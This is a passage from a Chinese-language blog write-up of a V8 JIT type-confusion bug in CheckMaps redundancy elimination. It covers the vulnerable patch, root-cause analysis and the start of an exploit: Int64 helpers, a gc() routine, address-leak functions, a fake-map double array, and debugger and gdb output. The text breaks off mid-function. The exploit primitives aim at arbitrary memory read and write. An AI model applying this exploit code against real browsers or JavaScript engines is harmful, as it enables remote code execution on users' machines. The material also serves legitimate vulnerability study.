class="line"></span><br><span class="line"><span class="comment">//padLeft用于字符串左补位</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// based on Long.js by dcodeIO</span></span><br><span class="line">  <span class="comment">// https://github.com/dcodeIO/Long.js</span></span><br><span class="line">  <span class="comment">// License Apache 2</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">_u64</span> </span>&#123;</span><br><span class="line">     <span class="keyword">constructor</span>(hi, lo) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lo_ = lo;</span><br><span class="line">        <span class="keyword">this</span>.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        <span class="keyword">var</span> hlo = (<span class="keyword">this</span>.lo_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.lo_ + <span class="number">1</span>) : <span class="keyword">this</span>.lo_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">var</span> hhi = (<span class="keyword">this</span>.hi_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.hi_ + <span class="number">1</span>) : <span class="keyword">this</span>.hi_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(hlo.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hlo = hlo.substr(<span class="number">2</span>,hlo.length);</span><br><span class="line">        <span class="keyword">if</span>(hhi.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hhi = hhi.substr(<span class="number">2</span>,hji.length);</span><br><span class="line">        hlo = <span class="string">"00000000"</span> + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length<span class="number">-8</span>, hlo.length);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0x"</span> + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.lo_ == <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == val.hi_ &amp;&amp; <span class="keyword">this</span>.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(<span class="keyword">this</span>.hi_ &amp; val.hi_, <span class="keyword">this</span>.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        <span class="keyword">var</span> a48 = <span class="keyword">this</span>.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a32 = <span class="keyword">this</span>.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> a16 = <span class="keyword">this</span>.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a00 = <span class="keyword">this</span>.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> b48 = val.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b32 = val.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> b16 = val.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b00 = val.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> c48 = <span class="number">0</span>, c32 = <span class="number">0</span>, c16 = <span class="number">0</span>, c00 = <span class="number">0</span>;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c00 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c16 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c32 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64((c48 &lt;&lt; <span class="number">16</span>) | c32, (c16 &lt;&lt; <span class="number">16</span>) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sub(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(~<span class="keyword">this</span>.hi_, ~<span class="keyword">this</span>.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.not().add(<span class="keyword">new</span> _u64(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((val &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) | ((val &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">              ((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) | ((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        <span class="keyword">var</span> lo = swap32(<span class="keyword">this</span>.lo_);</span><br><span class="line">        <span class="keyword">var</span> hi = swap32(<span class="keyword">this</span>.hi_);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> u64 = <span class="function"><span class="keyword">function</span>(<span class="params">hi, lo</span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这次exp编写中，用到的主要是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Int64.fromDouble(double num);</span><br><span class="line"><span class="keyword">new</span> Int64(int num).asDouble();</span><br></pre></td></tr></table></figure></p><ul><li><p><code>Int64.fromDouble(double num)</code><br>Constructs a new Int64 instance with the same bit representation as the provided double.<br>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(Int64.fromDouble(1.1));</span><br><span class="line">print(typeof(Int64.fromDouble(1.1)));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x3ff199999999999a</span><br><span class="line">object</span><br></pre></td></tr></table></figure></li><li><p><code>new Int64(int num).asDouble();</code><br>Return a double whith the same underlying bit representation.<br>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(new Int64(0x3ff199999999999a).asDouble());</span><br><span class="line">print(typeof(new Int64(0x3ff199999999999a).asDouble()));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">1.1000000000000227</span><br><span class="line">number</span><br></pre></td></tr></table></figure></li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index <span class="number">3</span>a40e8d..cb51acc <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ <span class="number">-5</span>,<span class="number">6</span> +<span class="number">5</span>,<span class="number">8</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/redundancy-elimination.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/node-properties.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/simplified-operator.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/objects-inl.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line">@@ <span class="number">-23</span>,<span class="number">6</span> +<span class="number">25</span>,<span class="number">7</span> @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckHeapObject:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckIf:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckNumber:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckReceiver:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckSmi:</span><br><span class="line">@@ <span class="number">-129</span>,<span class="number">6</span> +<span class="number">132</span>,<span class="number">14</span> @@ <span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       <span class="comment">// CheckInternalizedString(node) implies CheckString(node)</span></span><br><span class="line">+    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">+      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+      &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>每一个对象都有一个map来标记这个对象的类型，而checkmap就是用来检查这个对象的类型有没有变化的。<br>如果没变的话就可以一直走fast path，否则就要baliout。<br>根据给出的含漏洞的patch可知,JIT优化中的函数调用层次如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.Get(node)) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">Reduction RedundancyElimination::ReduceCheckNode(Node* node) &#123;</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks <span class="keyword">const</span>* checks = node_checks_.Get(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    <span class="keyword">return</span> Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a-&gt;op() != b-&gt;op()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先在Reduce里遇到CheckMaps的时候<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br></pre></td></tr></table></figure></p><p>为了找到最优的dominates，会去遍历其他的check<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br></pre></td></tr></table></figure></p><p>如果找到其他的CheckMaps的话，会检查是否“兼容”，会去看它们的maps，如果第一个检查已经包含第二个检查的话，就会把第二个检查给去掉。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    ...</span><br><span class="line">    Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">            DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">            <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>type confusion可以让我们得到对于用户空间任何object的读写权限，可以将任意一个对象的指针当成一个double读出来，也可以将任意一个double当成一个对象的指针写进去，这样我们就可以在一个地址伪造一个对象。</p><p>通过type confusion去fake map，fake ArrayBuffer，然后通过改我们fake的ArrayBuffer的BackingStore得到任意地址读写的原语。</p><h3 id="fake-map-prototype-amp-amp-constructor"><a href="#fake-map-prototype-amp-amp-constructor" class="headerlink" title="fake map prototype&amp;&amp;constructor"></a>fake map prototype&amp;&amp;constructor</h3><p><strong>PS.事实上这步可能不需要。只是当时学习别人exp的时候写的</strong><br>通过type confusion去leak ab的prototype地址，且由于prototype和constructor的地址偏移是固定的，所以可以去通过prototype的地址去计算出constructor的地址，然后将他们写入我们要fake的map对应的位置。<br>不过也可以直接用<code>ab.__proto__.constructor</code>得到constructor的地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><p>log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">要被leak的ArrayBuffer</span><br><span class="line">DebugPrint: 0x130c771022d9: [JSArrayBuffer]</span><br><span class="line"> - map = 0x228d52a02f71 [FastProperties]</span><br><span class="line">...</span><br><span class="line">0x228d52a02f71: [Map]</span><br><span class="line"> - type: JS_ARRAY_BUFFER_TYPE</span><br><span class="line">...</span><br><span class="line"> - prototype: 0x34f96880b7b9 &lt;Object map = 0x228d52a02fc1&gt;</span><br><span class="line"> - constructor: 0x34f96880b609 &lt;JSFunction ArrayBuffer (sfi = 0x157dbc033711)&gt;</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">34f96880b7b9</span><br><span class="line">34f96880b609</span><br></pre></td></tr></table></figure></p><h3 id="fake-map并leak出来"><a href="#fake-map并leak出来" class="headerlink" title="fake map并leak出来"></a>fake map并leak出来</h3><p>前后两次gc()，让ab_map_obj这个double array移动到old space里，并且让其和它的elements地址偏移恒定。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">//0xdaba0000daba0000，写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,     <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">6.73490047e-316</span>,            <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use constructor replace it</span></span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3e0338a149e9: [JSArray] in OldSpace</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> - elements = 0x3e0338a14a49 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">           0: -1.1264e+129</span><br><span class="line">           1: 3.4771e-308</span><br><span class="line">           2: 6.7349e-316</span><br><span class="line">         3-4: -1.1264e+129</span><br><span class="line">           5: 0</span><br><span class="line"> &#125;</span><br><span class="line">我们要fake的map在elements里，而elements的前面0x10分别是map和length，所以</span><br><span class="line">0x3e0338a14a49 + 0x10 -0x3e0338a149e9 = 0x70</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/20gx 0x3e0338a14a49-1</span><br><span class="line">0x3e0338a14a48:0x000037d6d7302de10x0000000600000000</span><br><span class="line">0x3e0338a14a58:0xdaba0000daba00000x001900c60f00000a</span><br><span class="line">0x3e0338a14a68:0x00000000082003ff0xdaba0000daba0000</span><br><span class="line">0x3e0338a14a78:0xdaba0000daba00000x0000000000000000</span><br><span class="line">0x3e0338a14a88:0x000037d6d73022010x0006b57800000000</span><br></pre></td></tr></table></figure><p>然后将其ab_map_obj的地址leak出来，加上0x70就是我们fake的map的地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"要leak出ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    